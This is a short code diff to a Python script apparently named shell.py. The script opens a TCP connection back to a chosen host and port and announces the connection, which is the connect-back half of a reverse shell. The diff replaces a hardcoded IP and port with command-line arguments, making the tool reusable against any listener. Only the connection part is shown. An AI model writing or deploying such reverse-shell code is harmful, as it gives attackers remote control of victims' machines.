@@ -1,10 +1,21 @@
 import subprocess
 import socket
+import sys
+
+def usage():
+	print("shell.py server port")
+	sys.exit()
+
+if len(sys.argv) != 3:
+	usage()
+	
+if sys.argv[1] == '-h':
+	usage()
+else:
+	host = sys.argv[1]
+	port = int(sys.argv[2])
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = '10.230.229.13'
-port = 4445
-
 sock.connect((host, port))
 sock.send("[*] Connection recieved.")
 
